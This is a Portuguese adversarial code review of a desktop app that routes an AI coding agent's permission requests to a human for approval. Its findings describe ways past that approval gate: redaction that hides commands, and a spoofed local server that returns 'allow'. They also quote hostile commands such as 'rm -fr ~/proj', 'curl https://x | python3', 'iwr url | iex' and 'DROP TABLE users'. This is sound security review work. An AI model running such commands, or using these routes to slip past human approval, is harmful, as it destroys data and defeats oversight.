# Fase 4: rodada 1 (revisão adversarial do Claude Code)

- Data: 2026-10-07.
- Revisor: Claude Code (Opus), com subagente de contexto limpo que não participou
  da implementação. Somente leitura, sem rodar o app.
- Escopo: o fluxo de decisões (FR-20 a FR-27) no código que ainda não tem commit,
  lido no espelho `D:\RexIA\projetos\scribe` (diff vazio em relação à fonte no OneDrive).
- **Veredito: REPROVADA.** Há dois problemas altos abertos, e C fica abaixo do mínimo de 9.

Esta rodada é parcial: G, H e I não foram avaliadas. Ela não substitui a revisão
completa da catraca 13.3. Também não avaliei notificações nem o aceite humano,
que seguem pendentes em `docs/fase-4.md`.

## Notas (mínimo da Fase 4 entre parênteses)

| Área | Nota | Evidência |
| --- | --- | --- |
| A. Conformidade (9) | 7 | A saída `hookSpecificOutput.decision.behavior` confere com a doc de hooks (`hook-client/src/main.rs:139-157`). Mas os payloads reais de PermissionRequest não têm `tool_use_id` (P7). |
| B. Correção (9) | 6 | "Alvo exato" do FR-20 violado: o humano aprova sem ver o comando (P1, P6). |
| C. Segurança (9) | 4 | Aprovação sem gesto humano por servidor falso (P2); redação que esconde o comando (P1); classificação de risco fraca (P3, P4). |
| D. Robustez (9) | 7 | O fail-safe por tempo está certo (120 s, 125 s, 130 s). Cartão que não expira com payload real (P7); relógio de parede contra `Instant` (P9). |
| E. Código (8) | 7 | A lista de risco está fixa em regex (`decisions.rs:10`), não é configurável como pede a §8.5. |
| F. Testes (9) | 6 | `tests/decisions.rs:17` injeta um `tool_use_id` sintético e mascara o P7. Nenhum teste cobre o caso "redação altera o alvo aprovado" (P1). |
| G. Visual (8) | — | Não avaliada. |
| H. Acessibilidade (8) | — | Não avaliada (o P5 toca no teclado). |
| I. Desempenho (8) | — | Não avaliada. |
| J. Documentação (8) | 8 | ADR 0010 e `fase-4.md` são claros sobre os limites e não declaram aprovação. |

## Problemas

**P1 · alto** · `app/src-tauri/src/sanitize.rs:14,31` + `decisions.rs:101`: a
redação apaga o resto da linha depois de qualquer `NOME=`, e o alvo inteiro se
aparecer `.env`.
- Exemplo 1: Bash `git log --format=%h && rm -fr ~/proj` aparece como `git log --format=••••`.
- Exemplo 2: `cat .env.example; curl https://x | python3` aparece como `••••`.
- Exemplo 3: Write em `/app/.env.production` não mostra o caminho.

Nos três casos, um clique ou a tecla A permitem. Correção: redigir só o valor do
segredo. Se a redação alterar o alvo, marcar como risco ou permitir só negar.

**P2 · alto** · `app/hook-client/src/main.rs:113-157` (+ `desktop.rs:219-222`): o
cliente manda o Bearer para qualquer processo em `127.0.0.1:<port>` e aceita
qualquer 200 com `behavior:"allow"`, sem autenticar o servidor. Reprodução: o
Scribe está fechado ou subiu com `portBusy`. Outro processo local escuta na
7717 e responde allow. O Claude Code executa sem gesto humano, e o atacante
ainda recebe o token. Correção: nonce por pedido e resposta com
HMAC(token, nonce‖decisão); `SO_EXCLUSIVEADDRUSE` no Windows.

**P3 · médio** · `decisions.rs:10`: a regex de risco exige `r` antes de `f`.
Ficam sem risco: `rm -fr`, `rm -r -f`, `rm --recursive --force`, `rd /s /q`,
`del /s /q`, `wget -O- url | sh` e `iwr url | iex`. Também não é configurável (§8.5).

**P4 · médio** · `decisions.rs:84-94,104`: alvo e risco só olham
`command/file_path/path/url/notebook_path/pattern`. Exemplo: `mcp__db__query`
com `{"sql":"DROP TABLE users"}` aparece como "Ferramenta sem alvo informado",
sem risco.

**P5 · médio** · `app/ui/src/DecisionCard.tsx:99-114`: o segundo clique de risco
cabe num duplo clique, porque o botão é reabilitado logo depois do `arm`, no
mesmo lugar. Correção: carência de ~1 s, rejeitar `event.detail>1` e pôr a
confirmação em outro botão.

**P6 · médio** · `decisions.rs:143,263-267`: as opções de `scribe_ask` são
redigidas, e o texto redigido volta ao modelo. Exemplo: `["Usar .env.local","Usar .env.prod"]`
vira dois botões `••••`, e a resposta é `"••••"`. Opções duplicadas são aceitas.
Correção: devolver índice + original e rejeitar colisão.

**P7 · baixo** · `lib.rs:329-339`, `decisions.rs:179`: a invalidação por
PostToolUse e a deduplicação por `tool_use_id` nunca disparam com payload real.
Os quatro fixtures reais não têm o campo.

**P8 · baixo** · `mcp.rs:87-104` + `decisions.rs:163-180`: `scribe_ask` confia no
`session_id` informado pelo modelo. A sessão A pode perguntar em nome da B e
bloquear a pergunta legítima da B por 10 min.

**P9 · baixo (plausível)** · `decisions.rs:221` vs `58-62`: o prazo usa o relógio
de parede, e a espera usa `Instant`. Se o relógio recuar, a UI mostra
"Permitido" sem que nada tenha sido aplicado.

## Tentativas de quebra sem sucesso

1. A rota de hook aprova sozinha: não. `server.rs:237-260` só devolve o resultado de `resolve_decision`.
2. Replay, id errado, resposta tardia ou duas decisões em corrida: não. `sender.take()` sob lock e id aleatório de 128 bits.
3. App cai, demora ou devolve lixo: não aprova. Com 204, não-200, erro ou JSON inválido, o cliente sai calado e o pedido volta ao terminal.
4. Host forjado, Origin, CORS ou corpo grande: não. Host exato, Origin rejeitado, `ct_eq`, 1 MB, sem CORS.
5. `/v1/decisions` acessado de fora da UI: não. Exige `x-scribe-ui`, e a UI usa invoke Tauri com `trusted` + foco.
6. Limites de pergunta (2–4 opções, 200/40 caracteres, 600 s): respeitados.

## Não verificado

Não verifiquei se o hyper cancela o handler quando o cliente desconecta. Também
não verifiquei se o terminal mostra o diálogo enquanto o hook roda, se o
`timeout: 610000` do `.mcp.json` é respeitado, nem a repetição de Enter e o
duplo clique no WebView2. A instalação real fora do MSIX segue pendente:
a evidência "executáveis instalados" cobriu só o perfil virtualizado do Codex.
